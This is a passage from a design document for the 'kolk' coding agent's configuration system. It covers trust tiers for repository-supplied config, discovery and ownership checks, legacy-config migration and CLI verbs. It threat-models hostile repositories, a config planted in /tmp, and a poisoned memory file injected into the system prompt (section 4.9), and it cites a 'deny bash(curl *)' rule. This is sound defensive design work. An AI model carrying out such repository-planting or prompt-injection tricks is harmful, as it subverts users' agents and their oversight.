perfectly well-meaning `.kolk/config.json` with an internal LiteLLM `base_url`; every colleague who
clones it and types `kolk` in that directory would get exit 2. A hostile repo does the same
deliberately with one line and no payload. **Any repository on earth becoming a kill switch for the
user's agent is a north-star failure, not a security win** — and it is the same argument the design
already makes against failing loudly in CI.

```
!  .kolk/config.json:4 — "base_url" is user-scope only and was ignored.
   your own setting is in use.   kolk config --why base_url
```

The **sole** exception is 05 §7.3 mechanism 2's secret-shaped-name refusal (`exit 2`, refuse the
whole file), which is already hardened and has a much narrower blast radius: a secret-shaped key in
a committed file is never legitimate, whereas a user-scope key in one is merely misplaced.

#### 4.5 `-p`, CI, git hooks, the daemon — one rule, no special case

When the loader lands (v0.2):

> **Tier P applies. Tier U is always ignored-with-a-line. Tier C is skipped unless consent already
> exists in `trust.json`, or `--trust-project` / `KOLK_TRUST_PROJECT=1` is passed. No prompt. No
> failure. No change to the exit code. One stderr line naming what was skipped and how to grant it.**

- **Not "ignore project config in CI."** Tier P *only tightens*; dropping it would make the
  unattended run **more permissive than the interactive one**. A repo saying `deny bash(curl *)`
  must hold hardest when nobody is watching.
- **Not "fail loudly."** Every CI job that clones a dependency shipping a `.kolk/` would break, and
  a security control that breaks the common path gets disabled — then it protects nobody.
- **Not "honour everything, it's CI."** That is the documented hazard in the field: hooks, the `env`
  block and `apiKeyHelper` are *used* under `-p` while `permissions.allow` is not — the low-damage
  row hardened and the RCE rows left open. Tier U makes that combination unrepresentable.
- **`--trust-project` and `-y`/yolo never imply each other**, and neither is implied by `-p`.
  *"I accept this repo's model choice"* ≠ *"run any command without asking."*

**No workspace-trust dialog, at any version.** *"Do you trust the files in this folder?"* is a
question a user who ran `git clone` thirty seconds ago cannot answer; it gets a reflexive yes. kolk
asks about **effects**, which are answerable, and Tier U is what bounds the worst answer:

```console
$ kolk
.kolk/config.json asks for:
    model   anthropic/claude-sonnet-4.6      (yours: openrouter/auto)
    effort  high                             (yours: medium)
Use them in this repo?  [y = yes · n = not now · never]  n

  running with your settings.  kolk config --why model   shows this again.
```

Consent is **state, not a dialog**: `paths.Data()/trust.json`, 0600, keyed on the **absolute path of
the `.kolk/` directory** (never a git repo root — kolk never runs `git` to decide trust, so there is
no `commondir` to spoof), bound to the file's **sha256 and the exact key list shown** (change the
file and the grant lapses with a diff). **Nothing in `trust.json` or anywhere else grants Tier U.**

#### 4.6 Discovery rules — all `os.Lstat`, no subprocess (v0.1 implements 1–5, reads nothing)

1. **Exactly one `.kolk/` is used:** the nearest ancestor of cwd. **No merging across directories** —
   closest-wins merging lets a nested vendored directory override the top-level file the user read.
2. **The walk stops** at the first directory containing a `.git` entry, at `$HOME`, or at the
   filesystem root. `.git`'s **existence** is checked; **its contents are never read** and `git` is
   never executed (02 §8 already bans `os/exec` outside `internal/shell`; `arch_test.go` enforces
   it, so "never shells out during discovery" is a CI assertion, not a promise).
3. **`$HOME/.kolk` is never project config** — running `kolk` in the home directory must not turn a
   user-scope directory into a repo-scope one.
4. **`.kolk` as a symlink ⇒ refuse the directory**, named line. No trust arithmetic, no target
   resolution.
5. **★ Ownership check.** Refuse any `.kolk` whose directory is not owned by the current uid or that
   is group/other-writable — the exact `os.Lstat` + `Stat_t.Uid` + mode check 05 §3.4 already
   mandates for `credentials.json`; **reuse it, do not invent a second one**. Without it,
   `cd /tmp/build-7f3 && kolk` walks to `/tmp` (world-writable on every Unix, no `.git`) and picks up
   `/tmp/.kolk/config.json` planted by any local user or any earlier CI job. Same for `/var/tmp` and
   shared build roots.
6. Every read goes through `openRegular` (§1.4).

#### 4.7 Committed vs gitignored, and the `.gitignore` story

| file | committed | authority |
|---|---|---|
| `.kolk/config.json` | **yes** — 05 §7.3: *"meant to be committed — that is the point"* | project scope, tier table applies |
| `.kolk/config.local.json` | **no** — gitignored | **identical tier table. No extra trust for being "local."** It wins on key collision; that is its only difference. |

The tempting rule — *"the local file is yours, so trust it"* — is unprovable and cheap to forge:
`.gitignore` does not untrack an already-tracked file, so a hostile repo commits **both**
`.kolk/config.local.json` **and** a `.kolk/.gitignore` naming it, and the file looks personal while
being repo-supplied. Detecting that requires running `git`, which requires trust, which requires the
git check — a circularity peers have conceded in their own docs. **Equal authority dissolves it: no
git call, no tracked/untracked distinction, no `-p` special case.**

**v0.1 writes no `.kolk/` directory at all.** Sessions and stats live in `paths.Data()`, the catalog
in `paths.Cache()`, credentials in `paths.Data()` — so `kolk` in a fresh repo creates nothing. The
`.gitignore` drop (05 §7.3 mechanism 4, pattern amended to `.kolk/cache/`, `.kolk/sessions/`,
`.kolk/*.local.json`) arrives with the first project **write** in v0.2 and never on a read path
(05 §1.3). It is **hygiene, not a control** — it prevents an accidental commit of a personal
override and stops a hostile repo from nothing, because §4.7's equal-authority rule already removed
the privilege it would be protecting. Say so in the code comment, so nobody later reasons from it.

#### 4.8 Ship-it verdict, and the named unblocker

**Project config does not ship in v0.1.** Four reasons, in order of weight:

1. **The v0.1 Tier-P set is empty.** Tier P is populated by `permission.rules` deny/ask (item 13,
   unbuilt), `saga.budget_usd` (item 10, unbuilt) and `tool.bash.timeout_s` — which has **no timeout
   mechanism in `internal/tools` to set** (verified: the word appears once, in a comment). Shipping
   the loader means either a file that only prompts, or inventing a key to keep the layer busy.
   **A key admitted to feed a mechanism is the precedent that makes the namespace grow.**
2. **Project config's value belongs to items 10, 13 and 16.** The genuinely useful sentence a repo
   can say is *"in this repo, never run `terraform apply` unattended"* — unsayable until the
   permission grammar exists.
3. **Boundary first, loader second; every peer that inverted the order paid** (two CVEs and a
   pre-trust-execution patch across two shipped agents). The boundary is cheapest to enforce while
   the registry is eight keys, which is now.
4. **North star.** A new user must never open a config file; a *project* config file is one they did
   not even write.

**Named unblocker: item 13 shipping the `permission.rules` grammar.** Then, in this order and no
other:

| step | ships |
|---|---|
| 1 | `Kind`, `ProjectOK`, `Tighter` on the registry + `testdata/golden/project_keys.txt` + the two table tests. **Before any loader.** *(This lands in v0.1 — §8.)* |
| 2 | The loader, **Tier P only**. No consent machinery, no prompt, no `trust.json`. A project file can only tighten: genuinely useful *and* a strict security improvement over v0.1. |
| 3 | 05 §7.3 mechanisms 1 and 2 (no `credential.*` in the schema; loader-level refusal by name), the `.kolk` ownership check, and the `strip`/`set` fuzz corpus — **in the same commit as step 2**. 05 wrote them against a loader that did not exist; they must not lag it by one release. |
| 4 | Tier C + digest-bound `trust.json` + `--trust-project`. **Only if a real user asks.** May never be needed. |

#### 4.9 The channel that already ships, said out loud

`internal/engine/agent.go:55` loads `KOLKRABBI.md` / `AGENTS.md` from the working directory into the
system prompt **today** — 16 KB cap, no trust check, every invocation. Shipping no project *config*
does not make a cloned repo inert, and this section would be dishonest not to say so.

**It stays, deliberately outside this boundary, for one reason: memory is *data for the model*, not
*authority over the process*.** A poisoned `KOLKRABBI.md` can only **ask**. Everything dangerous it
asks for still hits item 13's permission gate, and a project file can never loosen that gate without
consent and can never redirect the provider, spawn a process or move a path. **The composition is
the point:** Tier U is what makes tolerating the memory channel reasonable, and the memory channel
is what makes Tier U worth enforcing.

Two cheap mitigations, owned by item 12, noted here so they are not lost: the loaded memory file is
**named in the status line and in `kolk config --why`** (an invisible influence channel is the one
that gets weaponised), and `kolk doctor` warns on invisible-Unicode / bidi-control characters in it.

---

### 5. MIGRATION — the prototype's file, once, without losing a comment or a byte

#### 5.1 What exists on disk today, and what changes

The prototype's `config.json` is `{api_key?, model?, base_url?, tiers?}` with **nested** `tiers`
(`{"tiers": {"quick": "…"}}`). v0.1's file is flat JWCC whose member names are the dotted keys
themselves. Three migrations, each idempotent by shape, each already owned elsewhere in the tree —
item 18 only names the order and the alias table:

| # | migration | owner (already hardened) | trigger |
|---|---|---|---|
| 1 | move `sessions/`, `stats.jsonl` out of the config dir into `paths.Data()` | `paths.Migrate()` (`internal/paths/migrate.go`, tested) | every start, silent, never overwrites |
| 2 | evacuate `api_key` into the credential manifest, rewrite the file without it | `keystore.FileStore.MigrateLegacyConfig` (`internal/keystore/migrate.go`, fixture `testdata/v0-config-with-key.json`) | any config *write* command, or first store read that finds no manifest |
| 3 | flatten nested `tiers` → dotted keys | **item 18**, below | first registry-based load of a legacy-shaped file |

Order matters: 2 before 3, so the credential hand-off sees the original bytes and the flattener
never touches a key. All three are no-ops on a fresh install; `TestMigrateIsANoOpTheSecondTime` and
the keystore conflict tests already pin the "twice is nothing" property for 1 and 2.

#### 5.2 The alias table

Read-only, at load time, before validation. Nothing is ever written back under an old name.

| old shape / name | new name | rule |
|---|---|---|
| `"model"` | `model` | same value |
| `"base_url"` | `base_url` | same value |
| `"api_key"` | *(not a setting)* | removed by migration 2; if one survives (empty string), it is dropped with a Note |
| `"tiers": {"quick": m}` | `"effort.low.model": m` | **vocabulary rename**: item 7 aligns effort names with Claude Code's low/medium/high/max, so the prototype's `quick` maps to `low`, `standard` → `medium`, `deep` → `deep`, `ultra` → `max`. The rename lives in this table, not in the engine. |
| `"tiers": {"standard": m}` | `"effort.medium.model": m` | same |
| `"tiers": {"deep": m}` | `"effort.high.model": m` | same |
| `"tiers": {"ultra": m}` | `"effort.max.model": m` | same |

An unknown top-level member is a Note naming the line, not an error — the file may predate a key or
outlive one. A nested object that is *not* the legacy `tiers` shape is the §1.1 type error.

#### 5.3 The flattening write, and why it is crash-safe

The rewrite goes through the ordinary splice path (§1.3), not a reserialize: read → strip → map
members through the table → insert the new dotted members before the closing brace → remove the
`tiers` span → atomic re-parse verify → `atomicfile.Write` beside the symlink-resolved target.
A crash between insert and remove leaves both spellings; the loader prefers the dotted key (it wins
the alias pass) and the next successful `set` completes the removal. Worst case after a crash is one
Note naming both lines — never a lost tier mapping, because the alias pass reads both until the file
is clean.

**No backup file by default.** Migration 2's rewrite already passes through `atomicfile`; a second
`.bak` would double the number of places a plaintext `api_key` can survive (05's threat model),
and the splice verifier plus git/dotfiles cover regret better than a stale copy does. `--force`
(§1.3) remains the only path that creates a `.bak`.

#### 5.4 Versioned schema — rejected, with the escape hatch named

No `"$schema"` / `"version"` member in v0.x: a version field in a depth-one file with eight string
keys buys a second code path for zero information — the shapes are distinguishable in one look
(`tiers` present ⇒ legacy). If a future format change ever needs one, it lands as a reserved
top-level `$version` member handled exactly like §5.3's two-spelling transition, and the alias table
grows one row. The mechanism stays; the field waits for a reason.

---

### 6. UX SURFACE — the verbs, and what each one prints

02 §9 ships `kolk config`; item 18 fixes its sub-grammar. Every verb works while the file is broken
(§1.5); every write migrates first (§5).

```console
$ kolk config                 # usage line + resolved settings, origin-annotated
model      z-ai/glm-4.6:free                     user config.json:4
effort     medium                                default
mode       code                                  default
base_url   https://openrouter.ai/api/v1          default

$ kolk config get effort.high.model        # one value, or the inherit note
(not set — inherits model)

$ kolk config set effort.high.model anthropic/claude-opus-4.5
effort.high.model → anthropic/claude-opus-4.5   (~/.config/kolk/config.json, new line 6)

$ kolk config unset effort.high.model      # removes the member, keeps its comment
removed effort.high.model

$ kolk config edit                         # $KOLK_EDITOR, else $EDITOR, else vi; validates after
$ kolk config path                         # prints paths.Config()/config.json — scriptable, one line
```

`show`, `set-model`, `set-base-url`, `set-tier` keep working unchanged (parity with today's tree,
`internal/cli/cmd_config.go`); they are thin aliases — `set-model x` ≡ `set model x`,
`set-tier <e> <m>` ≡ `set effort.<l>.model m` after the §5.2 vocabulary rename. `/config` in the
REPL is the read-only view and obeys the parity rule for the read verbs. `kolk doctor` gains one
check: unknown keys + Notes from the last parse, rendered with the same renderer as §3.4's env
warning.

**What is deliberately absent:** no `config import` (the §5 migrations are automatic), no
`config reset` (delete the file; `path` tells you where), no interactive wizard (North star: kolk
never asks what it can compute).

---

### 7. SHIP LIST — v0.1 scope, test names, and the gates that hold it

#### 7.1 What lands in v0.1 (one PR, all gates green)

| step | content | where |
|---|---|---|
| 1 | `openRegular` guard helper + `strip()` + JWCC parse + `Members()` | `internal/config/file.go` |
| 2 | the registry: eight live rows (§2.1), reserved rows (§2.3), forbidden-name test (§2.4) | `internal/config/registry.go` |
| 3 | five-link resolve + Origin + the inherit rule (§2.2 ★) + invalid-value fall-through (§3.1) | `internal/config/resolve.go` |
| 4 | splice writer + symlink resolution + re-parse verify (§1.3) | `internal/config/file.go` |
| 5 | `--why` renderer incl. the cross-key hop (§3.3) + env-twin table + unknown-env warning (§3.2) | `internal/cli/cmd_config.go` |
| 6 | tiers flattener + alias table (§5.2–5.3) wired behind the existing `MigrateLegacyConfig` trigger | `internal/config/migrate.go` |
| 7 | boundary fields `Kind`/`ProjectOK`/`Tighter` + golden corpus + the two ratchet table tests (§4.8 step 1) — **before any loader** | `internal/config/registry.go`, `testdata/golden/project_keys.txt` |

Not in v0.1: the project loader itself, Tier C consent, `trust.json` (§4.8 owns their sequence).

#### 7.2 Test names that become CI

- `TestStripPreservesStringsAndDropsCommentsAndTrailingCommas`
- `TestSetSplicesAndKeepsATrailingComment` · `TestUnsetNeverRemovesComments`
- `TestSetRefusesToSpliceAMalformedFile` · `TestDuplicateMemberRewritesTheWinnerWithANote`
- `TestSaveResolvesSymlinksBeforeTheAtomicWrite` (pins the `paths.go:82` promise)
- `TestOpenRegularRefusesFifoSymlinkAndOversize`
- `TestEveryComputedDefaultIsPopulated` · `TestDefaultLayerTierNeverShadowsUserModel` (§2.2 ★)
- `TestInvalidEnvValueFallsThroughWithANote` · `TestUnknownEnvVarWarnsOncePerName`
- `TestOnlyStringKeysAreLive` · `TestForbiddenNamesAreNotInTheRegistry` · `TestReservedNamesExplainLandingVersion`
- `TestNoRegisteredKeyIsSecretShaped` (§2.4's name-based credential refusal, at registry level)
- `TestLegacyTiersFlattenThroughTheAliasTable` · `TestFlatteningIsIdempotentAndCrashSafe`
- `TestProjectFileCanOnlyTighten` (both directions, §4.3) — written now against the fields, loader later

#### 7.3 The gates that make the boundary mechanical

- arch rule **S5 extended** (§7.4): `internal/config` may not import `internal/secret`,
  `internal/keystore`, `os/exec`, `net/http` — a settings package that can reach the network or the
  store is the vulnerability class §2.4 forbids, enforced not promised.
- `go test ./protocol` stays dependency-zero; the budget gate holds the root graph at its current
  modules, so "no format library" cannot regress silently.
- `make check` runs the §7.2 table; the fuzz corpus from §1.2–1.3 joins the repository suite once
  codex's redact fuzz harness pattern lands (same shape: seed corpus + `Fuzz…` + benchmark).

#### 7.4 (cross-doc amendment to `02-architecture.md`) — S-rule wording

S5 currently names seven packages that may not import secret/keystore. Item 18 adds
`internal/config` to that row and adds one clause to S5's rationale: *"nor may any settings layer"*
— because a config key that could name a backend would otherwise be enforceable only by convention.

---

## Rationale

- **Flat JWCC beats TOML/YAML/nested JSON5** because the dotted-key grammar (02 §9) makes nesting a
  liability, the splice needs no AST at that shape, and the stdlib parses the stripped copy. The
  format survives its implementation; TOML's would die with `go-toml`.
- **Boundary before loader** (§4.8) because the peers' CVEs came from shipping the loader first, and
  because the boundary is cheapest to review while the registry has eight keys.
- **Aliases at load, never write-back** (§5.2): a write-back migration turns every old file into a
  diff in the user's dotfiles repo the first time kolk runs; an alias costs one map lookup per load.
- **Env twins are opt-in per row** (§3.2) because reverse-mapping is ambiguous once keys contain
  underscores, and because curation is what kept `KOLK_PROFILE` from auto-existing against item 5.

## Alternatives rejected

- `github.com/tidwall/sjson` / `hujson` — good libraries, wrong cost: L5's "allowed non-stdlib:
  none" row would need amending for ~40 lines of hand-written splicing (§1.6).
- Nested JSONC with dotted *and* nested spellings — two ways to say one thing is shadowing ambiguity
  (§1.1).
- TOML/YAML for comments — comments are solved by JSONC parsing + splice; a second format breaks
  every existing file and adds a dependency (§1).
- Persisting `permission.mode` — ambient yolo is the most dangerous key imaginable (§2.4).
- Auto-derived `KOLK_*` for every key — generates `KOLK_TOOL_BASH_TIMEOUT_S`, which reverse-maps
  four ways and silently creates forbidden families like `KOLK_PROVIDER_*` (§3.2).
- Version field in the file — a second code path with no information gain at eight keys (§5.4).
- Interactive setup wizard — violates North star rule 1; defaults are computed (§6).

## Risks & open questions

- **Hand-written splice correctness.** → Re-parse verify on every write (§1.3), fuzz corpus in CI
  (§7.3), and the pre-cut hujson escape hatch if it ever proves fragile. The format survives either way.
- **The `quick→low` vocabulary rename can surprise an existing user mid-project.** → The alias is
  silent at read but `kolk config show` renders the new name with `(was quick)` for one release;
  item 7's dial echo shows the active level on every change.
- **Two-spelling windows after a crash** (§5.3) leave Notes in `--why` output. → Self-heals on the
  next successful write; documented here so the Note text is not mistaken for a bug.
- **`OPENROUTER_BASE_URL` vs `KOLK_BASE_URL` precedence** is settled (KOLK wins, §3.2), but real
  dotfiles carry the legacy name. → `config --why base_url` renders both links explicitly, losers included.
- **Open:** whether `kolk config edit` should fall back to `vi` or refuse when neither editor var is
  set. Deferred to item 9's command surface; the safe default (refuse, print `path`) matches `gh`.
- **Open:** project `.gitignore` drop timing (v0.2, §4.7) interacts with item 13's permission files —
  sequencing owned there; noted so the `.kolk/*.local.json` pattern is not forgotten.

## Sources

- `docs/research/ecosystem.md` (2026-08-21) — mode/config surface survey: Claude Code `settings.json`
  precedent, gh's fatal-on-malformed-config behavior, Copilot's settings/behaviour mismatch reports.
- `docs/research/platform-strategy.md` (2026-08-22) — XDG split, `%AppData%` roaming hazard,
  NFSv3 UID assertion (05 §3.4 cross-reference).
- `docs/plan/05-auth-keys-secrets.md` §1.1, §1.3–1.6, §3.4, §7.1–7.3 (hardened 2026-08-22) — the
  credential chain, the manifest, the project-file rules item 18 implements mechanically.
- `docs/plan/02-architecture.md` §1 (layers/L5 dependency row), §8 (build tags), §9 (dotted keys,
  env rule, command grammar) (hardened 2026-08-22).
- `internal/paths/paths.go`, `internal/paths/migrate.go` — live layout, `ConfigFile()`, migration 1.
- `internal/keystore/migrate.go` + `testdata/v0-config-with-key.json` — migration 2, verified idempotent.
- `internal/cli/cmd_config.go`, `internal/config/config.go` — today's verbs and struct, quoted where
  the design replaces them.
